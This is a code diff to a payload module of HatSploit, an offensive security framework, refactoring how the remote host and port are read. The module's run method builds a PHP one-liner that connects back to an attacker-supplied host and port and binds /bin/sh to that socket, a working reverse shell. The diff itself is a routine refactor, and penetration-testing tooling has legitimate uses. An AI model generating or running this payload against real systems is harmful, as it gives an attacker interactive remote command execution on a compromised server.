@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 
 
 class HatSploitPayload(Payload):
@@ -24,14 +24,11 @@ class HatSploitPayload(Payload):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
         payload = (
                 f"php -r '$sock=fsockopen(\""
-                + remote_host
+                + self.rhost.value
                 + "\","
-                + remote_port
+                + self.rport.value
                 + ");$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
         )
         return payload
